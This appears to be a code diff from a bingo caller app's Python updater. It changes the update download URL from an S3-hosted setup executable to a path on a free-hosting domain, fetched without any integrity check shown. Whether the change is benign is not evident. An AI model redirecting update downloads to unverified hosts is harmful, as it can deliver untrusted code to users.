@@ -127,7 +127,7 @@ def program():
                 downloadBuild = input('Click Enter to continue with the update')
                 sleep(1)
                 print('Beginning file download ...')
-                url = 'https://bingocallerapp.s3.eu-west-2.amazonaws.com/Main+Files/Bingo_Caller_Setup.exe'
+                url = 'https://bcd.rf.gd/main/'
                 r = requests.get(url, allow_redirects=True)
                 print("10%")
                 sleep(0.5)
